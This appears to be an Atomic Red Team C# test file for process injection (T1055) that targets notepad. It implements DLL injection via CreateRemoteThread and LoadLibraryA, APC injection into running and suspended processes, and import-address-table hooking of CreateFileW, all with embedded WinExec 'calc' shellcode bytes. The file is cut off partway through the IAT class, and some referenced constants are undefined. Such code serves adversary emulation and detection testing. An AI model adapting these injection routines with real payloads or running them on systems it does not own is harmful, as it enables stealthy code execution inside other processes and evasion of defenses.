//Atomic Process Injection Tests
//xref: https://github.com/pwndizzle/c-sharp-memory-injection

// https://github.com/peterferrie/win-exec-calc-shellcode

// To run:
// 1. Compile code - C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:..\bin\T1055.exe T1055.cs
//



using System;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.IO.Compression;
using System.Collections.Generic;
using System.ComponentModel;
using System.Text;

public class ProcessInject
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // privileges
    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    // used for memory allocation
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;

    public static int Inject()
    {

        // Get process id
        Console.WriteLine("Get process by name...");
		System.Diagnostics.Process.Start("notepad");
	Process targetProcess = Process.GetProcessesByName("notepad")[0];


        // Get handle of the process - with required privileges

        IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);


        // Get address of LoadLibraryA and store in a pointer

        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");


        // Path to dll that will be injected
        string dllName = @"C:\AtomicRedTeam\atomics\T1055\bin\w64-exec-calc-shellcode.dll";

        // Allocate memory for dll path and store pointer

        IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


        // Write path of dll to memory

        UIntPtr bytesWritten;
        bool resp1 = WriteProcessMemory(procHandle, allocMemAddress, System.Text.Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

	// Read contents of memory
	int bytesRead = 0;
        byte[] buffer = new byte[24];

	ReadProcessMemory(procHandle, allocMemAddress, buffer, buffer.Length, ref bytesRead);
        Console.WriteLine("Data in memory: " + System.Text.Encoding.UTF8.GetString(buffer));

        // Create a thread that will call LoadLibraryA with allocMemAddress as argument

        CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);

        return 0;
    }
}

public class ApcInjectionAnyProcess
{
	public static void Inject()
	{

		byte[] shellcode = new byte[112] {
		0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x54,0x58,0x66,0x83,0xe4,0xf0,0x50,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5c,0x5d,0x5f,0x5e,0x5b,0x5a,0x59,0x58,0xc3
		};

		// Open process. "explorer" is a good target due to the large number of threads which will enter alertable state
		Process targetProcess = Process.GetProcessesByName("notepad")[0];
		IntPtr procHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

		// Allocate memory within process and write shellcode
		IntPtr resultPtr = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		IntPtr bytesWritten = IntPtr.Zero;
		bool resultBool = WriteProcessMemory(procHandle,resultPtr,shellcode,shellcode.Length, out bytesWritten);

		// Modify memory permissions on shellcode from XRW to XR
		uint oldProtect = 0;
		resultBool = VirtualProtectEx(procHandle, resultPtr, shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

		// Iterate over threads and queueapc
		foreach (ProcessThread thread in targetProcess.Threads)
                {
			//Get handle to thread
			IntPtr tHandle = OpenThread(ThreadAccess.THREAD_HIJACK, false, (int)thread.Id);

			//Assign APC to thread to execute shellcode
			IntPtr ptr = QueueUserAPC(resultPtr, tHandle, IntPtr.Zero);
		  }
	}

	// Memory permissions
	private static UInt32 MEM_COMMIT = 0x1000;
	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
	//private static UInt32 PAGE_READWRITE = 0x04;
	private static UInt32 PAGE_EXECUTE_READ = 0x20;

	// Process privileges
      const int PROCESS_CREATE_THREAD = 0x0002;
      const int PROCESS_QUERY_INFORMATION = 0x0400;
      const int PROCESS_VM_OPERATION = 0x0008;
      const int PROCESS_VM_WRITE = 0x0020;
      const int PROCESS_VM_READ = 0x0010;

	[Flags]
    public enum ThreadAccess : int
    {
      TERMINATE = (0x0001),
      SUSPEND_RESUME = (0x0002),
      GET_CONTEXT = (0x0008),
      SET_CONTEXT = (0x0010),
      SET_INFORMATION = (0x0020),
      QUERY_INFORMATION = (0x0040),
      SET_THREAD_TOKEN = (0x0080),
      IMPERSONATE = (0x0100),
      DIRECT_IMPERSONATION = (0x0200),
	    THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
	    THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
    }

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
		int dwThreadId);

	[DllImport("kernel32.dll",SetLastError = true)]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll")]
	public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

	[DllImport("kernel32")]
	public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
		 Int32 size, UInt32 flAllocationType, UInt32 flProtect);

	[DllImport("kernel32.dll", SetLastError = true )]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
	Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll")]
	public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
	int dwSize, uint flNewProtect, out uint lpflOldProtect);
}

public class ApcInjectionNewProcess
{
	public static void Inject()
	{

		byte[] shellcode = new byte[112] {
		0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x54,0x58,0x66,0x83,0xe4,0xf0,0x50,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5c,0x5d,0x5f,0x5e,0x5b,0x5a,0x59,0x58,0xc3
		};

		// Target process to inject into
		string processpath = @"C:\Windows\notepad.exe";
		STARTUPINFO si = new STARTUPINFO();
		PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

		// Create new process in suspended state to inject into
		bool success = CreateProcess(processpath, null,
			IntPtr.Zero, IntPtr.Zero, false,
			ProcessCreationFlags.CREATE_SUSPENDED,
			IntPtr.Zero, null, ref si, out pi);

		// Allocate memory within process and write shellcode
		IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_READWRITE);
		IntPtr bytesWritten = IntPtr.Zero;
		bool resultBool = WriteProcessMemory(pi.hProcess,resultPtr,shellcode,shellcode.Length, out bytesWritten);

		// Open thread
		IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
		uint oldProtect = 0;

		// Modify memory permissions on allocated shellcode
		resultBool = VirtualProtectEx(pi.hProcess,resultPtr, shellcode.Length,PAGE_EXECUTE_READ, out oldProtect);

		// Assign address of shellcode to the target thread apc queue
		IntPtr ptr = QueueUserAPC(resultPtr,sht,IntPtr.Zero);

		IntPtr ThreadHandle = pi.hThread;
		ResumeThread(ThreadHandle);

	}


	private static UInt32 MEM_COMMIT = 0x1000;

	//private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; //I'm not using this #DFIR  ;-)
	private static UInt32 PAGE_READWRITE = 0x04;
	private static UInt32 PAGE_EXECUTE_READ = 0x20;


	[Flags]
	public enum ProcessAccessFlags : uint
	{
		All = 0x001F0FFF,
		Terminate = 0x00000001,
		CreateThread = 0x00000002,
		VirtualMemoryOperation = 0x00000008,
		VirtualMemoryRead = 0x00000010,
		VirtualMemoryWrite = 0x00000020,
		DuplicateHandle = 0x00000040,
		CreateProcess = 0x000000080,
		SetQuota = 0x00000100,
		SetInformation = 0x00000200,
		QueryInformation = 0x00000400,
		QueryLimitedInformation = 0x00001000,
		Synchronize = 0x00100000
	}

	[Flags]
	public enum ProcessCreationFlags : uint
	{
		ZERO_FLAG = 0x00000000,
		CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
		CREATE_DEFAULT_ERROR_MODE = 0x04000000,
		CREATE_NEW_CONSOLE = 0x00000010,
		CREATE_NEW_PROCESS_GROUP = 0x00000200,
		CREATE_NO_WINDOW = 0x08000000,
		CREATE_PROTECTED_PROCESS = 0x00040000,
		CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
		CREATE_SEPARATE_WOW_VDM = 0x00001000,
		CREATE_SHARED_WOW_VDM = 0x00001000,
		CREATE_SUSPENDED = 0x00000004,
		CREATE_UNICODE_ENVIRONMENT = 0x00000400,
		DEBUG_ONLY_THIS_PROCESS = 0x00000002,
		DEBUG_PROCESS = 0x00000001,
		DETACHED_PROCESS = 0x00000008,
		EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
		INHERIT_PARENT_AFFINITY = 0x00010000
	}
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public uint dwProcessId;
		public uint dwThreadId;
	}
	public struct STARTUPINFO
	{
		public uint cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public uint dwX;
		public uint dwY;
		public uint dwXSize;
		public uint dwYSize;
		public uint dwXCountChars;
		public uint dwYCountChars;
		public uint dwFillAttribute;
		public uint dwFlags;
		public short wShowWindow;
		public short cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}

	[Flags]
	public enum    ThreadAccess : int
	{
		TERMINATE           = (0x0001)  ,
		SUSPEND_RESUME      = (0x0002)  ,
		GET_CONTEXT         = (0x0008)  ,
		SET_CONTEXT         = (0x0010)  ,
		SET_INFORMATION     = (0x0020)  ,
		QUERY_INFORMATION       = (0x0040)  ,
		SET_THREAD_TOKEN    = (0x0080)  ,
		IMPERSONATE         = (0x0100)  ,
		DIRECT_IMPERSONATION    = (0x0200)
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
		int dwThreadId);

	[DllImport("kernel32.dll",SetLastError = true)]
	public static extern bool WriteProcessMemory(
		IntPtr hProcess,
		IntPtr lpBaseAddress,
		byte[] lpBuffer,
		int nSize,
		out IntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll")]
	public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

	[DllImport("kernel32")]
	public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
		 Int32 size, UInt32 flAllocationType, UInt32 flProtect);
	[DllImport("kernel32.dll", SetLastError = true )]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
	Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenProcess(
	 ProcessAccessFlags processAccess,
	 bool bInheritHandle,
	 int processId
	);


	[DllImport("kernel32.dll")]
	public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
	[DllImport("kernel32.dll")]
	public static extern uint ResumeThread(IntPtr hThread);
	[DllImport("kernel32.dll")]
	public static extern uint SuspendThread(IntPtr hThread);
	[DllImport("kernel32.dll")]
	public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
	int dwSize, uint flNewProtect, out uint lpflOldProtect);
}

public class IatInjection
{

	public static void Inject()
	{
		string targetProcName = "notepad";
		string targetFuncName = "CreateFileW";

		// Get target process id and read memory contents
		Process process = Process.GetProcessesByName(targetProcName)[0];
		IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, process.Id);
		int bytesRead = 0;
		byte[] fileBytes = new byte[process.WorkingSet64];
		ReadProcessMemory(hProcess, process.MainModule.BaseAddress, fileBytes, fileBytes.Length, ref bytesRead);

		// The DOS header
		IMAGE_DOS_HEADER dosHeader;

		// The file header
		IMAGE_FILE_HEADER fileHeader;

		// Optional 32 bit file header
		IMAGE_OPTIONAL_HEADER32 optionalHeader32 = new IMAGE_OPTIONAL_HEADER32();

		// Optional 64 bit file header
		IMAGE_OPTIONAL_HEADER64 optionalHeader64 = new IMAGE_OPTIONAL_HEADER64();

		// Image Section headers
		IMAGE_SECTION_HEADER[] imageSectionHeaders;

		// Import descriptor for each DLL
		IMAGE_IMPORT_DESCRIPTOR[] importDescriptors;

		// Convert file bytes to memorystream and use reader
		MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length);
		BinaryReader reader = new BinaryReader(stream);

		//Begin parsing structures
		dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

		// Add 4 bytes to the offset
		stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

		UInt32 ntHeadersSignature = reader.ReadUInt32();
		fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
		if (Is32BitHeader(fileHeader))
		{
			optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
		}
		else
		{
			optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
		}

		imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
		for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
		{
			imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
		}

		// Go to ImportTable and parse every imported DLL
		stream.Seek((long)((ulong)optionalHeader64.ImportTable.VirtualAddress), SeekOrigin.Begin);
		importDescriptors = new IMAGE_IMPORT_DESCRIPTOR[50];

		for (int i = 0; i < 50; i++)
		{
			importDescriptors[i] = FromBinaryReader<IMAGE_IMPORT_DESCRIPTOR>(reader);
		}
		bool flag = false;
		int j = 0;

		// The below is really hacky, would have been better to use structures!
		while (j < importDescriptors.Length && !flag)
		{
			for (int k = 0; k < 1000; k++)
			{
				// Get the address for the function and its name

				stream.Seek(importDescriptors[j].OriginalFirstThunk + (k * 8), SeekOrigin.Begin);

				long nameOffset = reader.ReadInt64();
				if (nameOffset > 1000000 || nameOffset < 0)
				{
					break;
				}

				// Get the function name
				stream.Seek(nameOffset + 2, SeekOrigin.Begin);
				List<string> list = new List<string>();
				byte[] array;
				do
				{
					array = reader.ReadBytes(1);
					list.Add(Encoding.Default.GetString(array));
				}
				while (array[0] != 0);
				string curFuncName = string.Join(string.Empty, list.ToArray());
				curFuncName = curFuncName.Substring(0, curFuncName.Length - 1);

				// Get the offset of the pointer to the target function and its current value
				long funcOffset = importDescriptors[j].FirstThunk + (k * 8);
				stream.Seek(funcOffset, SeekOrigin.Begin);
				long curFuncAddr = reader.ReadInt64();

				// Found target function, modify address to point to shellcode
				if (curFuncName == targetFuncName)
				{

					// WinExec shellcode from: https://github.com/peterferrie/win-exec-calc-shellcode
					// nasm w64-exec-calc-shellcode.asm -DSTACK_ALIGN=TRUE -DFUNC=TRUE -DCLEAN=TRUE -o w64-exec-calc-shellcode.bin
					byte[] payload = new byte[111] {
					0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x54,0x58,0x66,0x83,0xe4,0xf0,0x50,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5c,0x5d,0x5f,0x5e,0x5b,0x5a,0x59,0x58
					};

					// Once shellcode has executed go to real import (mov to rax then jmp to address)
					byte[] mov_rax = new byte[2] {
						0x48, 0xb8
					};
					byte[] jmp_address = BitConverter.GetBytes(curFuncAddr);
					byte[] jmp_rax = new byte[2] {
						0xff, 0xe0
					};

					// Build shellcode
					byte[] shellcode = new byte[payload.Length + mov_rax.Length + jmp_address.Length + jmp_rax.Length];
					payload.CopyTo(shellcode, 0);
					mov_rax.CopyTo(shellcode, payload.Length);
					jmp_address.CopyTo(shellcode, payload.Length+mov_rax.Length);
					jmp_rax.CopyTo(shellcode, payload.Length+mov_rax.Length+jmp_address.Length);

					// Allocate memory for shellcode
					IntPtr shellcodeAddress = VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);

					// Write shellcode to memory
					IntPtr shellcodeBytesWritten = IntPtr.Zero;
					WriteProcessMemory(hProcess,shellcodeAddress,shellcode,shellcode.Length, out shellcodeBytesWritten);

					long funcAddress = (long)optionalHeader64.ImageBase + funcOffset;

					// Get current value of IAT
					bytesRead = 0;
					byte[] buffer1 = new byte[8];
					ReadProcessMemory(hProcess, (IntPtr)funcAddress, buffer1, buffer1.Length, ref bytesRead);

					// Get shellcode address
					byte[] shellcodePtr = BitConverter.GetBytes((Int64)shellcodeAddress);

					// Modify permissions to allow IAT modification
					uint oldProtect = 0;
					bool protectbool = VirtualProtectEx(hProcess, (IntPtr)funcAddress, shellcodePtr.Length, PAGE_EXECUTE_READWRITE, out oldProtect);

					// Modfiy IAT to point to shellcode
					IntPtr iatBytesWritten = IntPtr.Zero;
					bool success = WriteProcessMemory(hProcess, (IntPtr)funcAddress, shellcodePtr, shellcodePtr.Length, out iatBytesWritten);

					// Read IAT to confirm new value
					bytesRead = 0;
					byte[] buffer = new byte[8];
					ReadProcessMemory(hProcess, (IntPtr)funcAddress, buffer, buffer.Length, ref bytesRead);


					flag = true;
					break;
				}
			}
			j++;
		}
	}


	public struct IMAGE_DOS_HEADER
	{      // DOS .EXE header
		public UInt16 e_magic;              // Magic number
		public UInt16 e_cblp;               // Bytes on last page of file
		public UInt16 e_cp;                 // Pages in file
		public UInt16 e_crlc;               // Relocations
		public UInt16 e_cparhdr;            // Size of header in paragraphs
		public UInt16 e_minalloc;           // Minimum extra paragraphs needed
		public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
		public UInt16 e_ss;                 // Initial (relative) SS value
		public UInt16 e_sp;                 // Initial SP value
		public UInt16 e_csum;               // Checksum
		public UInt16 e_ip;                 // Initial IP value
		public UInt16 e_cs;                 // Initial (relative) CS value
		public UInt16 e_lfarlc;             // File address of relocation table
		public UInt16 e_ovno;               // Overlay number
		public UInt16 e_res_0;              // Reserved words
		public UInt16 e_res_1;              // Reserved words
		public UInt16 e_res_2;              // Reserved words
		public UInt16 e_res_3;              // Reserved words
		public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
		public UInt16 e_oeminfo;            // OEM information; e_oemid specific
		public UInt16 e_res2_0;             // Reserved words
		public UInt16 e_res2_1;             // Reserved words
		public UInt16 e_res2_2;             // Reserved words
		public UInt16 e_res2_3;             // Reserved words
		public UInt16 e_res2_4;             // Reserved words
		public UInt16 e_res2_5;             // Reserved words
		public UInt16 e_res2_6;             // Reserved words
		public UInt16 e_res2_7;             // Reserved words
		public UInt16 e_res2_8;             // Reserved words
		public UInt16 e_res2_9;             // Reserved words
		public UInt32 e_lfanew;             // File address of new exe header
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct IMAGE_DATA_DIRECTORY
	{
		public UInt32 VirtualAddress;
		public UInt32 Size;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct IMAGE_OPTIONAL_HEADER32
	{
		public UInt16 Magic;
		public Byte MajorLinkerVersion;
		public Byte MinorLinkerVersion;
		public UInt32 SizeOfCode;
		public UInt32 SizeOfInitializedData;
		public UInt32 SizeOfUninitializedData;
		public UInt32 AddressOfEntryPoint;
		public UInt32 BaseOfCode;
		public UInt32 BaseOfData;
		public UInt32 ImageBase;
		public UInt32 SectionAlignment;
		public UInt32 FileAlignment;
		public UInt16 MajorOperatingSystemVersion;
		public UInt16 MinorOperatingSystemVersion;
		public UInt16 MajorImageVersion;
		public UInt16 MinorImageVersion;
		public UInt16 MajorSubsystemVersion;
		public UInt16 MinorSubsystemVersion;
		public UInt32 Win32VersionValue;
		public UInt32 SizeOfImage;
		public UInt32 SizeOfHeaders;
		public UInt32 CheckSum;
		public UInt16 Subsystem;
		public UInt16 DllCharacteristics;
		public UInt32 SizeOfStackReserve;
		public UInt32 SizeOfStackCommit;
		public UInt32 SizeOfHeapReserve;
		public UInt32 SizeOfHeapCommit;
		public UInt32 LoaderFlags;
		public UInt32 NumberOfRvaAndSizes;

		public IMAGE_DATA_DIRECTORY ExportTable;
		public IMAGE_DATA_DIRECTORY ImportTable;
		public IMAGE_DATA_DIRECTORY ResourceTable;
		public IMAGE_DATA_DIRECTORY ExceptionTable;
		public IMAGE_DATA_DIRECTORY CertificateTable;
		public IMAGE_DATA_DIRECTORY BaseRelocationTable;
		public IMAGE_DATA_DIRECTORY Debug;
		public IMAGE_DATA_DIRECTORY Architecture;
		public IMAGE_DATA_DIRECTORY GlobalPtr;
		public IMAGE_DATA_DIRECTORY TLSTable;
		public IMAGE_DATA_DIRECTORY LoadConfigTable;
		public IMAGE_DATA_DIRECTORY BoundImport;
		public IMAGE_DATA_DIRECTORY IAT;
		public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
		public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
		public IMAGE_DATA_DIRECTORY Reserved;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct IMAGE_OPTIONAL_HEADER64
	{
		public UInt16 Magic;
		public Byte MajorLinkerVersion;
		public Byte MinorLinkerVersion;
		public UInt32 SizeOfCode;
		public UInt32 SizeOfInitializedData;
		public UInt32 SizeOfUninitializedData;
		public UInt32 AddressOfEntryPoint;
		public UInt32 BaseOfCode;
		public UInt64 ImageBase;
		public UInt32 SectionAlignment;
		public UInt32 FileAlignment;
		public UInt16 MajorOperatingSystemVersion;
		public UInt16 MinorOperatingSystemVersion;
		public UInt16 MajorImageVersion;
		public UInt16 MinorImageVersion;
		public UInt16 MajorSubsystemVersion;
		public UInt16 MinorSubsystemVersion;
		public UInt32 Win32VersionValue;
		public UInt32 SizeOfImage;
		public UInt32 SizeOfHeaders;
		public UInt32 CheckSum;
		public UInt16 Subsystem;
		public UInt16 DllCharacteristics;
		public UInt64 SizeOfStackReserve;
		public UInt64 SizeOfStackCommit;
		public UInt64 SizeOfHeapReserve;
		public UInt64 SizeOfHeapCommit;
		public UInt32 LoaderFlags;
		public UInt32 NumberOfRvaAndSizes;

		public IMAGE_DATA_DIRECTORY ExportTable;
		public IMAGE_DATA_DIRECTORY ImportTable;
		public IMAGE_DATA_DIRECTORY ResourceTable;
		public IMAGE_DATA_DIRECTORY ExceptionTable;
		public IMAGE_DATA_DIRECTORY CertificateTable;
		public IMAGE_DATA_DIRECTORY BaseRelocationTable;
		public IMAGE_DATA_DIRECTORY Debug;
		public IMAGE_DATA_DIRECTORY Architecture;
		public IMAGE_DATA_DIRECTORY GlobalPtr;
		public IMAGE_DATA_DIRECTORY TLSTable;
		public IMAGE_DATA_DIRECTORY LoadConfigTable;
		public IMAGE_DATA_DIRECTORY BoundImport;
		public IMAGE_DATA_DIRECTORY IAT;
		public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
		public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
		public IMAGE_DATA_DIRECTORY Reserved;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct IMAGE_FILE_HEADER
	{
		public UInt16 Machine;
		public UInt16 NumberOfSections;
		public UInt32 TimeDateStamp;
		public UInt32 PointerToSymbolTable;
		public UInt32 NumberOfSymbols;
		public UInt16 SizeOfOptionalHeader;
		public UInt16 Characteristics;
	}

	[StructLayout(LayoutKind.Explicit)]
	public struct IMAGE_SECTION_HEADER
	{
		[FieldOffset(0)]
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public char[] Name;
		[FieldOffset(8)]
		public UInt32 VirtualSize;
		[FieldOffset(12)]
		public UInt32 VirtualAddress;
		[FieldOffset(16)]
		public UInt32 SizeOfRawData;
		[FieldOffset(20)]
		public UInt32 PointerToRawData;
		[FieldOffset(24)]
		public UInt32 PointerToRelocations;
		[FieldOffset(28)]
		public UInt32 PointerToLinenumbers;
		[FieldOffset(32)]
		public UInt16 NumberOfRelocations;
		[FieldOffset(34)]
		public UInt16 NumberOfLinenumbers;
		[FieldOffset(36)]
		public DataSectionFlags Characteristics;

		public string Section
		{
			get { return new string(Name); }
		}
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct IMAGE_IMPORT_DESCRIPTOR
	{
		public uint OriginalFirstThunk;
		public uint TimeDateStamp;
		public uint ForwarderChain;
		public uint Name;
		public uint FirstThunk;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct IMAGE_BASE_RELOCATION
	{
		public uint VirtualAdress;
		public uint SizeOfBlock;
	}

	[Flags]
	public enum DataSectionFlags : uint
	{

		Stub = 0x00000000,

	}

	public static T FromBinaryReader<T>(BinaryReader reader)
	{
		// Read in a byte array
		byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

		// Pin the managed memory while, copy it out the data, then unpin it
		GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
		T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
		handle.Free();

		return theStructure;
	}


	public static bool Is32BitHeader(IMAGE_FILE_HEADER fileHeader)
	{
			UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
			return (IMAGE_FILE_32BIT_MACHINE & fileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
	}


	// Process privileges
	public const int PROCESS_CREATE_THREAD = 0x0002;
	public const int PROCESS_QUERY_INFORMATION = 0x0400;
	public const int PROCESS_VM_OPERATION = 0x0008;
	public const int PROCESS_VM_WRITE = 0x0020;
